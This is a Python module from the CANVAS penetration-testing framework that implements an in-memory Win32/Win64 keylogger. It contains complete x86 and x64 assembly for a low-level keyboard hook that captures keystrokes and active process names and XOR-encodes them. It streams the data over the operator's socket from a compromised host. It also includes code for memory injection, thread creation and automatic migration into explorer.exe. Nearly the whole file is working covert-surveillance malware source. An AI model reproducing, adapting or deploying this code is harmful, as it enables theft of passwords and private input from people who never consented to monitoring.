#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from localNode import localNode
from encoder import chunkedaddencoder
from timeoutsocket import Timeout
from ExploitTypes.localcommand import LocalCommand

NAME            = "In-Memory Win32/Win64 Keylogger"
DESCRIPTION     = "In-Memory Win32/Win64 Keylogger (Live Streaming)"
DOCUMENTATION   = {}
VERSION         = "1.1"

PROPERTY={}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Windows"] ]

DOCUMENTATION['Notes'] = """

This module will log keystrokes in memory and stream them live to CANVAS.

The only requirement is that the logger has to be in a process that is in the
active desktop. E.g. explorer.exe. So if you're in a process that is NOT on
the active desktop (say lsass.exe or services.exe) you need to run mosdefmigrate
and pass the pid of a process that is in the active desktop. Once the migration
is complete, you can proceed to run this module.

If auto-migrate is enabled (the default), the module will first check to see
if we are running inside explorer.exe and, if not, try to automatically migrate to it.

"""

NOTES="""
"""

TRIGGER = '\xaa\xbb\xcc\xdd'

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name        = NAME
        self.node        = None
        self.is_win64    = False
        self.automigrate = True

    def neededListenerTypes(self): 
        return []

    def getargs(self):
        """
        Get all the arguments from the commandline or gui
        """
        self.getarg("automigrate")
    
    def hookProcedure(self, node):
        hookFunctionVars = {}
        
        #struct WM_KEYBOARD_LL {
        #    int vkCode;
        #    int scanCode;
        #    int flags;
        #    int time;
        #               
        #    int *dwExtraInfo;
        #};

    
        hookFunctionAsmWin32 = """
        // because this has to be a callable standalone function, and we can't
        // do function pointers properly I have to do this handler in assembly
        
        push %ebp
        movl %esp, %ebp

        pushl %ebx
        pushl %esi
        pushl %edi

        starthook:
        
        // get our in args (nCode, wParam, lParam)
        movl 0x08(%ebp), %ebx // nCode
        movl 0x0c(%ebp), %ecx // wParam
        movl 0x10(%ebp), %edx // lParam -> is a pointer to a WH_KEYBOARD_LL struct

        // HC_ACTION == 0
        test %ebx, %ebx
        jnz callnexthook

        // if HC_ACTION we can process this event
        // check for either wParam of WM_SYSKEYDOWN or WM_KEYDOWN
        cmpw $0x0100, %cx // WM_KEYDOWN
        je processevent
        cmpw $0x0104, %cx // WM_SYSKEYDOWN
        jne callnexthook

        processevent:
        // test for keys we want to SKIP here, (like shift being held down is annoying)
        // first DWORD in the WH_KEYBOARD_LL struct is a vkCode
        movb (%edx), %al
        cmpb $0x14, %al // VK_CAPITAL
        je callnexthook
        cmpb $0xa0, %al // VK_LSHIFT
        je callnexthook
        cmpb $0xa1, %al // VK_RSHIFT
        je callnexthook

        // WINDOW HANDLE HANDLING HERE...
        movl $GETFGWINDOW, %eax
        call *%eax 
        jmp getwindow
        
        gotwindow:
        popl %ebx
        cmpl %eax, (%ebx)
        je getkeyname // skip process name muck if same handle as last log event
        movl %eax, (%ebx) // update if not equal
        
        processname:
        pushl %eax // save handle
        
        // get the PID of the window process
        pushl $0
        movl %esp, %ecx
        pushl %ecx // &PID
        pushl %eax // push handle
        movl $GETWPID, %eax
        call *%eax
        popl %eax
        // pid in eax, checkme, do PS style fun

        // to get full name use snapshot kernel32.dll toolhelp
        // or openprocess/getbasemodulefromhandle...problem:
        // these require outside dlls, and because this logger
        // is injectable, we can not assume psapi or toolhelp
        // is available for the remote thread..so toolhelp
        // is the only option

        pushl %edi
        pushl %eax
        
        // process entry struct
        subl $1060, %esp
        movl %esp, %edi // edi points to struct
        
        // get snapshot handle
        pushl $0
        pushl $2
        movl $CREATETOOLHELP32SNAPSHOT, %eax
        call *%eax
        test %eax, %eax
        jz getkeyname
        
        // set size into struct
        movl $1060, (%edi)

        pushl %eax
        // process first
        pushl %edi
        pushl %eax
        movl $PROCESS32FIRST, %eax
        call *%eax
        test %eax, %eax
        jz errortoolhelp
        popl %eax // get handle back

        // check if it's our process
        movl 8(%edi), %ebx
        cmpl %ebx, 1060(%edi) // where our saved PID lives
        je logname

        // loop through all the processes untill we find our pid
        nextprocessloop:
        
        pushl %eax
        // process next
        pushl %edi
        pushl %eax
        movl $PROCESS32NEXT, %eax
        call *%eax
        test %eax, %eax
        jz errortoolhelp
        popl %eax

        movl 8(%edi), %ebx
        cmpl %ebx, 1060(%edi)
        jne nextprocessloop

        logname:
        pushl %eax // push handle        
        addl $36, %edi // edi now points to a null terminated string with the name
        movl %edi, %esi
        movl 1028(%edi), %edi // get filehandle for log header

        // pre header ## NAME.EXE ##
        // terminate with some spaces
        movl $0x2023230d, %ecx  // little kludge for now
        decl %ecx
        pushl %ecx
        movl %esp, %ecx

        pushl $4
        pushl %ecx
        pushl %edi
        call writenet
        
        // clear stack
        popl %eax

        // loop until nul byte
        writenamebyte:
        pushl $1
        pushl %esi
        pushl %edi
        call writenet

        // test next char for nul
        incl %esi
        xorl %ecx, %ecx
        movb (%esi), %cl
        test %ecx, %ecx
        jnz writenamebyte

        // terminate with a NAME.EXE ## newline
        movl $0x0b232320, %ecx // little kludge for now
        subl $0x01000000, %ecx // workaround
        pushl %ecx
        movl %esp,%ecx

        pushl $4
        pushl %ecx
        pushl %edi
        call writenet
        // clear stack
        popl %eax
        
        // close snapshot handle and continue into getkeyname
        errortoolhelp:
        
        // handle is already on stack, close it
        movl $CLOSEHANDLE, %eax
        call *%eax
        // adjust stack, and restore vars
        addl $1060, %esp
        popl %eax
        popl %edi

        getkeyname:
        subl $0x100, %esp
        movl %esp, %esi // lpString
        // use GetKeyNameText to get a description
        movl 0x10(%ebp), %edx // get lParam
        movl $1, %eax
        movl 4(%edx), %ebx // scanCode
        movl 8(%edx), %ecx // flags
        shll $16, %ebx // put scanCode bits in right place
        shll $24, %ecx // put flags bits in right place
        orl %ebx, %eax 
        orl %ecx, %eax // lParam for GetKeyNameText 
        
        pushl $0x100
        pushl %esi
        pushl %eax
        movl $GETKEYNAME, %eax
        call *%eax
        pushl %edi
        pushl %esi
        pushl %eax
        // eax now has length of string

        // test for L_SHIFT/R_SHIFT/CAPS_LOCK accordingly
        // shiftstate in esi, capstate in edi
        pushl $0x10 // VK_SHIFT
        movl $GETKEYSTATE, %eax
        call *%eax
        andl $0x8000, %eax
        shrl $15, %eax
        movl %eax, %esi

        pushl $0x14 // VK_CAPITAL
        movl $GETKEYSTATE, %eax
        call *%eax
        andl $1, %eax
        movl %eax, %edi

        // test capstate XOR shiftstate
        xorl %edi, %esi
        test %esi, %esi
        jnz nolower
        
        // tolower any char
        // if len == 1, not-special char
        cmpl $1, (%esp)
        jne nolower
        movl 4(%esp), %esi

        // ok lower this character if > 0x40
        movb (%esi), %cl
        movb $0x40, %ch
        cmpb %cl, %ch
        jge nolower
        
        addb $0x20, %cl
        movb %cl, (%esi)
        
        nolower:

        popl %eax
        popl %esi
        popl %edi
        
        flushtolog:
        // if eax is not 1, we need special char brackets [Space]
        cmpl $1, %eax
        jne special

        notspecial:

        nop // our memcpy works as a string literal, prevent 0x22 byte

        pushl %eax
        pushl %esi
        pushl %edi
        call writenet
        jmp logged // kludge

        // special bracket name bracket logging format
        special:

        pushl %eax
        pushl $0x5b
        movl %esp, %ecx
        pushl $1
        pushl %ecx
        pushl %edi
        call writenet
        popl %eax
        popl %eax

        pushl %eax
        pushl %esi
        pushl %edi
        call writenet
        
        pushl $0x5d
        movl %esp, %ecx
        pushl $1
        pushl %ecx
        pushl %edi
        call writenet
        // end of special name logging

        logged:

        // 104 due to pushl 0x5d cleanup, also fixes 0x100
        // mosdef quirk for now
        addl $0x104, %esp

        movl $0xffffffff, %eax
        pushl %eax
        movl  %esp, %eax
        pushl $4
        pushl %eax
        pushl %eax
        call writenet
        popl  %eax

        callnexthook:

        pushl 0x10(%ebp) // lParam
        pushl 0x0c(%ebp) // wParam
        pushl 0x08(%ebp) // nCode
        pushl $0
        movl $NEXTHOOK, %eax // do this dynamically after testing
        call *%eax

        returnhooker:
        
        // return value is already in %eax
        popl %edi
        popl %esi
        popl %ebx
        
        movl %ebp, %esp
        pop %ebp
        
        ret $12 // 3 dword args to this function

        // HELPER FUNCTIONS

        // writeblock(char*, size)
        writeblock:
        push %ebp
        mov  %esp, %ebp

        pushl %esi
        pushl %edi
        pushl %ebx

        movl 8(%ebp),  %esi  // char*
        movl 12(%ebp), %edi  // size

        // XOR everything with xorkey

        pushl %esi
        pushl %edi
        pushl %ecx

        xorl %ecx, %ecx
        movl %edi, %ecx
        movl %esi, %edi

        writeblock_loop1:
        lodsb
        xor $XORKEY, %al
        stosb
        dec %ecx
        test %ecx, %ecx
        jnz writeblock_loop1

        popl %ecx
        popl %edi
        popl %esi
    
        writeblock_loop2:
        pushl $0
        pushl %edi
        pushl %esi
        pushl $MOSDEF_FD
        movl  $SEND,%eax
        call *%eax
        sub   %eax, %edi
        add   %eax, %esi
        test  %edi, %edi
        jne   writeblock_loop2

        popl %ebx
        popl %edi
        popl %esi
        
        movl %ebp, %esp
        pop %ebp
        ret $8

        // writenet(ignored, string, len)
        writenet:

        push %ebp
        movl %esp,%ebp

        pushl %esi
        pushl %edi
        pushl %ebx

        // get the args 
        movl 8(%ebp),  %edi  // handle
        movl 12(%ebp), %esi  // string
        movl 16(%ebp), %ebx  // len

        
        pushl %ebx
        movl  %esp, %eax
        pushl $4
        pushl %eax
        
        call writeblock
        popl  %eax

        pushl %ebx
        pushl %esi
        call writeblock

        // return value is already in %eax
        popl %ebx
        popl %edi
        popl %esi
        
        movl %ebp,%esp
        pop %ebp

        ret $12 // ignored, string, length
        
// GLOBALS
        // uuuuggglyyyyyyy !
        getwindow:
        call gotwindow
        .long 0x41424344
        """

        hookFunctionAsmWin64 = """
    pushq %rbp
    pushq %rbx
    pushq %rdi
    pushq %rsi
    pushq %r12
    pushq %r13
    pushq %r14
    pushq %r15
    movq %rsp, %rbp
starthook:
    // get our in args (nCode, wParam, lParam)
    movq %rcx, %r12      // nCode
    movq %rdx, %r13      // wParam
    movq %r8,  %r14      // lParam -> is a pointer to a WH_KEYBOARD_LL struct

    // HC_ACTION == 0
    test %r12, %r12
    jnz callnexthook

    // if HC_ACTION we can process this event
    // check for either wParam of WM_SYSKEYDOWN or WM_KEYDOWN
    cmpw $0x0100,%r13w // WM_KEYDOWN
    je processevent
    cmpw $0x0104,%r13w // WM_SYSKEYDOWN
    jne callnexthook

processevent:

    // test for keys we want to SKIP here, (like shift being held down is annoying)
    // first DWORD in the WH_KEYBOARD_LL struct is a vkCode
    movb (%r14),%al
    cmpb $0x14,%al // VK_CAPITAL
    je callnexthook
    cmpb $0xa0,%al // VK_LSHIFT
    je callnexthook
    cmpb $0xa1,%al // VK_RSHIFT
    je callnexthook

    // WINDOW HANDLE HANDLING HERE...
    movq $GETFGWINDOW,%rax
    call *%rax 

    jmp getwindow
gotwindow:
    popq %rbx
    cmp %rax,(%rbx)
    je getkeyname // skip process name muck if same handle as last log event
    movq %rax,(%rbx) // update if not equal

processname:
    pushq %rax // save handle

    // get the PID of the window process
    pushq $0
    movq %rsp,%rdx
    movq %rax,%rcx // push handle
    movq $GETWPID,%rax
    call *%rax
    popq %rax
    // pid in rax, checkme, do PS style fun

    // to get full name use snapshot kernel32.dll toolhelp
    // or openprocess/getbasemodulefromhandle...problem:
    // these require outside dlls, and because this logger
    // is injectable, we can not assume psapi or toolhelp
    // is available for the remote thread..so toolhelp
    // is the only option

    pushq %rax

    // process entry struct
    subq $0x1060,%rsp
    movq %rsp,%rdi // rdi points to struct

    // get snapshot handle
    movq $0, %rdx
    movq $2, %rcx
    movq $CREATETOOLHELP32SNAPSHOT,%rax
    call *%rax
    test %rax,%rax
    jz getkeyname

    // set size into struct
    movl $0x1060,(%rdi)

    pushq %rax 

    // process first
    mov %rdi, %rdx
    mov %rax, %rcx
    movq $PROCESS32FIRST,%rax
    call *%rax
    test %rax,%rax
    jz errortoolhelp

    pop %rax // get handle back

    // check if it's our process
    movl 8(%rdi),%ebx
    cmpl %ebx,0x1060(%rdi) // where our saved PID lives
    je logname

// loop through all the processes untill we find our pid
nextprocessloop:

    pushq %rax

    // process next
    movq %rdi, %rdx
    movq %rax, %rcx 
    movq $PROCESS32NEXT,%rax
    call *%rax
    test %eax,%eax
    jz errortoolhelp

    popq %rax

    movl 8(%rdi),%ebx
    cmpl %ebx,0x1060(%rdi)
    jne nextprocessloop

logname:
    pushq %rax // push handle

    add $0x2C,%rdi // edi now points to a null terminated string with the name

    movq %rdi,%rsi

    // pre header ## NAME.EXE ##
    // terminate with some spaces
    movq $0x2023230d,%rax  // little kludge for now

    push %rax
    movq %rsp,%rcx

    movq $4,  %r8
    mov %rcx, %rdx
    mov %r15, %rcx
    call writenet

    // clear stack
    pop %rax

    // loop untill nul byte
writenamebyte:
    movq $1, %r8
    mov %rsi, %rdx
    mov %r15, %rcx
    call writenet

    // test next char for nul
    incl %rsi
    xor %rcx,%rcx
    movb (%rsi),%cl
    test %ecx,%ecx
    jnz writenamebyte

    // terminate with a NAME.EXE ## newline
    movl $0x0b232320,%ecx // little kludge for now
    subl $0x01000000,%ecx // workaround
    push %rcx
    movq %rsp,%rax

    movq $4, %r8
    mov %rax, %rdx
    mov %r15, %rcx
    call writenet

    // clear stack
    pop %rax

// close snapshot handle and continue into getkeyname
errortoolhelp:
    // handle is already on stack, close it
    pop %rcx
    movq $CLOSEHANDLE,%rax
    call *%rax

    // adjust stack, and restore vars
    add $0x1060,%rsp
    pop %rax

getkeyname:
    sub $0x1000, %rsp
    movq %rsp, %rsi // lpString

    // use GetKeyNameText to get a description
    movq %r14,%rdx // get lParam
    movl $1,%eax
    xor %rbx, %rbx
    xor %rcx, %rcx
    movl 4(%rdx),%ebx // scanCode
    movl 8(%rdx),%ecx // flags
    shll $16,%ebx // put scanCode bits in right place
    shll $24,%ecx // put flags bits in right place
    orl %ebx,%eax 
    orl %ecx,%eax // lParam for GetKeyNameText 

    movq %rsi, %rbx
    pushq $0
    pushq $0
    pushq $0
    movq $0x1000, %r8
    movq %rsi, %rdx
    movl %eax, %ecx
    movq $GETKEYNAME,%rax
    call *%rax
    add $0x18, %rsp

    pushq %rax // rax now has length of string

    // edi = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
    pushq $0  // shadow space
    movq $0x14, %rcx // VK_CAPITAL
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $1,%eax
    movl %eax,%edi

    // GetKeyState(VK_SHIFT) & 0x8000) != 0
    pushq $0  // shadow space
    movq $0x10, %rcx // VK_SHIFT
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $0x8000,%eax
    test %eax, %eax
    jnz change_lower_case

    // GetKeyState(VK_LSHIFT) & 0x8000) != 0
    pushq $0  // shadow space
    movq $0xA0, %rcx // VK_SHIFT
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $0x8000,%eax
    test %eax, %eax
    jnz change_lower_case

    // GetKeyState(VK_RSHIFT) & 0x8000) != 0
    pushq $0  // shadow space
    movq $0xA1, %rcx // VK_SHIFT
    movq $GETKEYSTATE,%rax
    call *%rax
    popq %rsi      // eat shadow space
    andl $0x8000,%eax
    test %eax, %eax
    jnz change_lower_case

    jmp test_is_lower


change_lower_case:
    test %edi, %edi
    jz lower_to_true
    mov $0, %edi
    jmp test_is_lower
 lower_to_true:
    mov $1, %edi


test_is_lower:
    test %edi,%edi
    jnz nolower

    // tolower any char
    // if len == 1, not-special char
    cmpl $1,(%rsp)
    jne nolower
    movq %rbx, %rsi

    // ok lower this character if > 0x40
    movb (%rsi),%cl
    movb $0x40,%ch
    cmpb %cl,%ch
    jge nolower

    addb $0x20,%cl
    movb %cl,(%rsi)

nolower:

    popq %rax
    movq %rbx, %rsi

flushtolog:
    // if eax is not 1, we need special char brackets [Space]
    cmpl $1,%eax
    jne special

notspecial:

    nop // our memcpy works as a string literal, prevent 0x22 byte

    movq %rax, %r8
    movq %rsi, %rdx
    movq %r15, %rcx
    call writenet
    jmp logged // kludge

// special bracket name bracket logging format
special:

    pushq %rax

    pushq $0x5b
    movq %rsp,%rcx

    movq $1, %r8
    movq %rcx, %rdx
    movq %r15, %rcx
    call writenet
    popq %rax    // eat string

    popq %rax   // restore string size

    movq %rax, %r8
    movq %rsi, %rdx
    movq %r15, %rcx
    call writenet

    pushq $0x5d
    movq %rsp,%rcx

    movq $1, %r8
    movq %rcx, %rdx
    movq %r15, %rcx    
    call writenet
    popq %rax    // eat string
    // end of special name logging

logged:
    add $0x1000,%rsp
    movq $0xffffffffffffffff, %rax
    pushq %rax
    movq %rsp,%rdx
    movq $4, %r8
    movq %r15, %rcx    
    call writenet
    popq %rax    // eat string

callnexthook:
    pushq $0
    pushq $0
    pushq $0
    pushq $0
    movq %r14, %r9
    movq %r13, %r8
    movq %r12, %rdx
    movq $0, %rcx
    movq $NEXTHOOK,%rax // do this dynamically after testing
    call *%rax
    add $0x20, %rsp

returnhooker:
    // return value is already in %eax
    movq %rbp,%rsp
    popq %r15
    popq %r14
    popq %r13
    popq %r12
    popq %rsi
    popq %rdi
    popq %rbx
    popq %rbp    
    ret

    // HELPER FUNCTIONS

// writeblock(char*, size)
writeblock:
    push %rbp
    push %rsi
    push %rdi
    push %r11
    push %r12
    push %r13
    movq %rsp,%rbp

    movq %rcx, %r11  // char*
    movq %rdx, %r12  // size

    // XOR everything with xorkey
    xor %rcx, %rcx
    movq %r12, %rcx
    movq %r11, %rdi
    movq %rdi, %rsi

writeblock_loop1:
    lodsb
    xor $XORKEY, %al
    stosb
    dec %rcx
    test %rcx, %rcx
    jnz writeblock_loop1

writeblock_loop2:
    pushq $0
    pushq %r12
    pushq %r11
    pushq $MOSDEF_FD

    movq $0, %r9
    movq %r12, %r8
    movq %r11, %rdx
    movq $MOSDEF_FD, %rcx
    movq $SEND, %rax
    call *%rax
    add $0x20, %rsp

    sub   %rax, %r12
    add   %rax, %r11
    test  %r12, %r12
    jne   writeblock_loop2

    movq %rbp,%rsp
    pop %r13
    pop %r12
    pop %r11
    pop %rdi
    pop %rsi
    pop %rbp
    ret 

    // writenet(ignored, string, len)
writenet:
    push %rbp
    push %rsi
    push %rdi
    push %r11
    push %r12
    push %r13
    movq %rsp,%rbp

    movq %rcx, %r11
    movq %rdx, %r12
    movq %r8, %r13

    pushq %r13
    movq  %rsp, %rcx
    movq $4, %rdx
    call writeblock
    popq  %rax

    mov %r13, %rdx
    mov %r12, %rcx
    call writeblock

    movq %rbp,%rsp
    pop %r13
    pop %r12
    pop %r11
    pop %rdi
    pop %rsi
    pop %rbp
    ret 

getwindow:
    call gotwindow


    .long 0x41424344
    .long 0x45464748
"""


        # get the addies for CallNextHookEx dynamically
        
        NEXTHOOK                 = node.shell.getprocaddress_withmalloc("user32.dll|CallNextHookEx")
        CLOSEHANDLE              = node.shell.getprocaddress_withmalloc("kernel32.dll|CloseHandle")
        GETKEYNAME               = node.shell.getprocaddress_withmalloc("user32.dll|GetKeyNameTextA")
        GETKEYSTATE              = node.shell.getprocaddress_withmalloc("user32.dll|GetKeyState")
        GETFGWINDOW              = node.shell.getprocaddress_withmalloc("user32.dll|GetForegroundWindow")
        GETWPID                  = node.shell.getprocaddress_withmalloc("user32.dll|GetWindowThreadProcessId")
        CREATETOOLHELP32SNAPSHOT = node.shell.getprocaddress_withmalloc("kernel32.dll|CreateToolhelp32Snapshot")
        PROCESS32FIRST           = node.shell.getprocaddress_withmalloc("kernel32.dll|Process32First")
        PROCESS32NEXT            = node.shell.getprocaddress_withmalloc("kernel32.dll|Process32Next")
        SEND                     = node.shell.getprocaddress_withmalloc("ws2_32.dll|send")

        hookFunctionAsm = hookFunctionAsmWin64 if self.is_win64 else hookFunctionAsmWin32

        hookFunctionAsm = hookFunctionAsm.replace("NEXTHOOK", "0x%X"%NEXTHOOK)
        hookFunctionAsm = hookFunctionAsm.replace("CLOSEHANDLE", "0x%X"%CLOSEHANDLE)
        hookFunctionAsm = hookFunctionAsm.replace("GETKEYNAME", "0x%X"%GETKEYNAME)
        hookFunctionAsm = hookFunctionAsm.replace("GETKEYSTATE", "0x%X"%GETKEYSTATE)
        hookFunctionAsm = hookFunctionAsm.replace("GETFGWINDOW", "0x%X"%GETFGWINDOW)
        hookFunctionAsm = hookFunctionAsm.replace("GETWPID", "0x%X"%GETWPID)
        hookFunctionAsm = hookFunctionAsm.replace("CREATETOOLHELP32SNAPSHOT", "0x%X"%CREATETOOLHELP32SNAPSHOT)
        hookFunctionAsm = hookFunctionAsm.replace("PROCESS32FIRST", "0x%X"%PROCESS32FIRST)
        hookFunctionAsm = hookFunctionAsm.replace("PROCESS32NEXT", "0x%X"%PROCESS32NEXT)
        hookFunctionAsm = hookFunctionAsm.replace("SEND", "0x%X"%SEND)
        hookFunctionAsm = hookFunctionAsm.replace("MOSDEF_FD", "%s" % node.shell.fd)
        hookFunctionAsm = hookFunctionAsm.replace("XORKEY", "%s" % node.shell.xorkey)

        # node compile and return the stub
        from MOSDEF import mosdef
        hookFunction = mosdef.assemble(hookFunctionAsm, "X64" if self.is_win64 else "X86")
        return hookFunction


    def localThread(self, node, logCode):
        threadVars = {}

        threadVars["CODESIZE"] = len(logCode)
        threadVars["THREADME"] = logCode

        threadCode = """
        #import "IMPORT_TYPE", "kernel32.dll|CreateThread" as "CreateThread"
        #import "IMPORT_TYPE", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "IMPORT_TYPE", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"

        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"

        #import "int", "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main() 
        {            
            HANDLE_TYPE hThread;
            char *fp;
            HANDLE_TYPE hMtx;

            fp = VirtualAlloc(0, CODESIZE, 0x1000, 0x40);
            memcpy(fp, THREADME, CODESIZE);
            hThread = CreateThread(0, 0, fp, 0, 0, 0);

            if (hThread == 0)
            {
                // failed
                sendint(hThread);
            }

            CloseHandle(hThread);
            sendint(1);
        }
        """
        if self.is_win64:
            threadCode = threadCode.replace('IMPORT_TYPE', 'local')
            threadCode = threadCode.replace('HANDLE_TYPE', 'unsigned long long')
        else:
            threadCode = threadCode.replace('IMPORT_TYPE', 'remote')
            threadCode = threadCode.replace('HANDLE_TYPE', 'unsigned int')
        return node.shell.runCode(threadCode, threadVars)


    def bootstrap(self, node):
        hookFunction = self.hookProcedure(node)

        # because MOSDEF is not good at function pointers, I have to node compile the stub
        # and memcpy the function into memory so I have an actual address for my procedure
        
        hookLoggerVars                 = {}
        hookLoggerVars["HOOKSIZE"]     = len(hookFunction)
        hookLoggerVars["HOOKFUNCTION"] = hookFunction
        
        hookLoggerCode = """
        #import "IMPORT_TYPE", "kernel32.dll|GetModuleHandleA"  as "GetModuleHandleA"
        #import "IMPORT_TYPE", "user32.dll|SetWindowsHookExA"   as "SetWindowsHookExA"
        #import "IMPORT_TYPE", "user32.dll|UnhookWindowsHookEx" as "UnhookWindowsHookEx"
        #import "IMPORT_TYPE", "kernel32.dll|VirtualAlloc"      as "VirtualAlloc"
        #import "IMPORT_TYPE", "user32.dll|RegisterHotKey"      as "RegisterHotKey"
        #import "IMPORT_TYPE", "user32.dll|GetMessageA"         as "GetMessageA"
        #import "IMPORT_TYPE", "kernel32.dll|ExitThread"        as "ExitThread"

        #import "local", "debug"  as "debug"
        #import "local", "memcpy" as "memcpy"
        #import "local", "sendint" as "sendint"
        
        #import "string", "HOOKFUNCTION" as "HOOKFUNCTION"
        #import "int",    "HOOKSIZE"     as "HOOKSIZE"

        struct POINT {
            int x;
            int y;
        };

        struct MSG {
            int hwnd;
            int message;
            char *wParam;
            char *lParam;
            int time;
            struct POINT pt;
        };

        void messageHandler(int tMsg)
        {
            // example from MSDN
            int bRet;
            int mRet;
            struct MSG msg;

            // we're only interested in tMsg, so set range accordingly
            // PM_NOREMOVE == 0x0000 PM_REMOVE == 0x0001 for peekmessage
            while(bRet = GetMessageA(&msg, 0, 0, 0))
            {
                return;
            }
        }

        void main()
        {
            char *KeyEvent;
            HANDLE_TYPE hHook;
            HANDLE_TYPE hModule;
            struct MSG msg;
            int tMSG;

             // exit control via hotkey
            RegisterHotKey(0, 0xdeadbabe, 0x04, 0x77); // RIGHT SHIFT + F8

            // get an address for our function because MOSDEF
            // doesn't do function pointers correctly yet
            KeyEvent = VirtualAlloc(0, HOOKSIZE, 0x1000, 0x40);   
            memcpy(KeyEvent, HOOKFUNCTION, HOOKSIZE);

            // handle to module
            hModule = GetModuleHandleA(0);
        
            // install the hook (WH_KEYBOARD_LL == 13)
            hHook = SetWindowsHookExA(13, KeyEvent, hModule, 0);
            messageHandler(tMsg);
            UnhookWindowsHookEx(hHook);
            ExitThread(0);
        }
        """

        # node compile and return the logger
        node.shell.clearfunctioncache()

        if self.is_win64:
            hookLoggerCode = hookLoggerCode.replace('IMPORT_TYPE', 'local')
            hookLoggerCode = hookLoggerCode.replace('HANDLE_TYPE', 'unsigned long long')
        else:
            hookLoggerCode = hookLoggerCode.replace('IMPORT_TYPE', 'remote')
            hookLoggerCode = hookLoggerCode.replace('HANDLE_TYPE', 'unsigned int')

        request = node.shell.compile(hookLoggerCode, hookLoggerVars)

        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring("\"\n\x00")
        hookLogger = encoder.encode(request)
        return hookLogger
    
    def run(self):
        self.getargs()
        self.node = self.argsDict["passednodes"][0]

        if self.node.nodetype not in ["win32Node", "win64Node"]:
            self.log("The node named %s of type %s is not supported." % (self.node.get_name(), self.node.nodetype))
            return 0

        self.is_win64 = True if self.node.nodetype == 'win64Node' else False
        
        result = 0
        
        if self.automigrate:
            self.log('Testing whether we are inside explorer.exe')
            pname = self.exploitnodes("getprocessname", nodes=[self.node])
            self.log("Process name: %s" % pname)
            
            if pname[0][0].lower() != 'explorer.exe':
                self.log('Trying auto-migration to explorer.exe..')

                migrate = self.engine.getModuleExploit("mosdefmigrate")
                migrate.link(self)
                migrate.argsDict['pid'] = 'explorer.exe'
                ret = migrate.run()

                if not ret:
                    self.log("Couldn't migrate, aborting..")
                    return 0

        fd     = self.node.shell.fd
        self.log('Using remote MOSDEF FD: %s' % fd)
        self.log('Initializing keylogger from a new thread..')
        
        ret = self.localThread(self.node, self.bootstrap(self.node))

        if ret == 0:
            self.log('Error on thread initialization, aborting..')
            return 0

        main_vars = {'FD' : fd}
        
        main_code = """
        #import "IMPORT_TYPE", "ws2_32.dll|send"   as "send"
        #import "IMPORT_TYPE", "ws2_32.dll|recv"   as "recv"
        #import "IMPORT_TYPE", "ws2_32.dll|select" as "select"
        #import "IMPORT_TYPE", "user32.dll|keybd_event" as "keybd_event"

        #import "local", "sendint" as "sendint"
        #import "int", "FD" as "FD"

        struct timeval {
            int tv_sec;
            int tv_usec;
        };

        void main() {
            struct timeval tv;
            int read_set[3];
            int ret;
            int i;
            int count;
            char *p;

            while (1) {
                read_set[0] = 1;
                read_set[1] = FD;

                tv.tv_sec   = 0;
                tv.tv_usec  = 500000;

                ret = select(2, &read_set, 0, 0, &tv);

                if (ret > 0) {
                    // Send the termination hotkey
                    keybd_event(0xA1, 0x45, 1, 0);
                    keybd_event(0x77, 0x45, 1, 0);
                    keybd_event(0x77, 0x45, 3, 0);
                    keybd_event(0xA1, 0x45, 3, 0);

                    i     = 0;
                    ret   = 0;
                    count = 0;
                    p     = &i;

                    while (count < 4) {
                        ret   = recv(FD, p, 4-count, 0);

                        if (ret <= 0) {
                            return;
                        }
                        
                        count = count + ret;
                        p     = p + ret;
                    }
                    
                    sendint(i);
                    return;
                }
            }
        }
        """

        self.node.shell.clearfunctioncache()

        if self.is_win64:
            main_code = main_code.replace('IMPORT_TYPE', 'local')
            main_code = main_code.replace('HANDLE_TYPE', 'unsigned long long')
        else:
            main_code = main_code.replace('IMPORT_TYPE', 'remote')
            main_code = main_code.replace('HANDLE_TYPE', 'unsigned int')

        request = self.node.shell.compile(main_code, main_vars)
        self.node.shell.sendrequest(request)

        key_buffer = ''

        try:
            while True:
                try:
                    self.node.shell.connection.set_timeout(1)
                    size = self.node.shell.readint()
                    self.node.shell.connection.set_timeout(None)
                    buf  = self.node.shell.readbuf(size)
                    # We have an entire key sequence
                    if size == 4 and buf == '\xff\xff\xff\xff':
                        self.log(key_buffer)
                        key_buffer = ''
                    else:
                        # Buffer it until we get a complete key sequence
                        key_buffer += buf
 
                except Timeout:
                    self.node.shell.connection.set_timeout(None)
                    if self.getState() == self.HALT: break
                    continue
        except KeyboardInterrupt:
            self.node.shell.connection.set_timeout(None)
            self.log('Caught CTRL-C, aborting..')

        self.log('Terminating keylogger..')
        self.node.shell.writebuf(TRIGGER)
        buf = []

        while True:
            buf.append(self.node.shell.reliableread(1))
            
            if hexify(buf[-4:]) == hexify(TRIGGER):
                self.log('Successfully stopped keylogger at remote end')
                break

        self.node.shell.leave()
        self.setInfo("%s - done (success)" % (NAME))
        return 1
